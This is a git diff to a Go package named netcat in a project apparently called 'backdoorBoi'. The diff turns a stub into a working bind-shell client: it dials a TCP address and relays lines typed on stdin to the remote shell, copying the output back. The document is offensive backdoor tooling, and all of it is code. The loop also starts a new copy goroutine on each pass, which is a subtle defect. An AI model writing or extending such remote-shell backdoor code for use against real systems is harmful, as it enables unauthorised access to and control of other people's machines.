@@ -1,12 +1,15 @@
 package netcat
 
 import (
+	"bufio"
 	"flag"
 	"fmt"
 	"io"
 	"log"
 	"net"
+	"os"
 	"os/exec"
+	"strings"
 	"time"
 
 	"github.com/BuildAndDestroy/backdoorBoi/pkg/environment"
@@ -174,5 +177,34 @@ func RevHandleDarwin(caller net.Conn) {
 }
 
 func CallBindLogic(callAddress string, osRuntime string) {
-	log.Println("Caller logic hit")
+	caller, err := net.Dial("tcp", callAddress)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer caller.Close()
+
+	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)
+
+	switch osRuntime {
+	case "linux":
+		BindShellCall(caller)
+	default:
+		log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
+	}
+}
+
+func BindShellCall(caller net.Conn) {
+	for {
+		reader := bufio.NewReader(os.Stdin)
+		text, err := reader.ReadString('\n')
+		if err != nil {
+			log.Fatalln(err)
+		}
+		text = strings.TrimSpace(text)
+		_, err = io.WriteString(caller, text+"\n")
+		if err != nil {
+			log.Fatalln(err)
+		}
+		go io.Copy(os.Stdout, caller)
+	}
 }
